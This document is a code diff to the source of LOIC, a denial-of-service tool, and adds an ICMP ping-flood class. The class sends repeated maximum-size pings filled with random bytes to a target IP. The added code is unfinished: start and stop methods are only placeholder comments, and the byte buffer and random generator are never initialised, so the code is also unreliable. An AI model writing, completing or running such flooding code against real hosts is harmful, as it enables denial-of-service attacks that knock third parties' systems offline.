@@ -14,6 +14,7 @@ using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -525,4 +526,71 @@ namespace LOIC
 			}
 		}
 	} // class SlowLoic
+
+
+     //start of ICMP class
+
+    public class ICMP : cHLDos
+    {
+   
+        private string _ip;
+        private int _port;
+        
+        private Random _random;
+        private int _PingsPerThread;
+        private byte[] _BytesToSend;
+        private Ping _pingsender;
+       
+
+        /// <summary>
+        /// Create the ICMP object, because we need that, for reasons
+        /// </summary>
+
+        public ICMP(string ip, int port, int PingsPerThread )
+        {
+           this._ip = ip;
+           this._port = port;
+           this._PingsPerThread = PingsPerThread; 
+           
+            //not sure if need to initiliase as bw_work is a nonstatic field anyway
+            //_BytesToSend = new byte[65499];
+
+            
+            
+
+        }
+
+        //add start override
+
+        //add stop override
+
+
+
+        //while working away
+        private  void bw_DoWork (int _PingsPerThread, Ping pingSender, string _ip){
+             
+            //fill an array with 65499 random bytes bytes 
+            for(int b = 0; b < 65499; b++){
+               
+              _BytesToSend[b] = Convert.ToByte(_random.Next(1,50));
+            }
+        
+            
+            
+           PingOptions opt = new PingOptions();
+            opt.DontFragment = false;
+            opt.Ttl = 128;
+
+
+            for (int i = 0; i < _PingsPerThread; i++)
+            {
+                pingSender.Send(_ip, 1, _BytesToSend, opt);
+            }
+
+           
+
+        
+          
+        }
+    }
 }
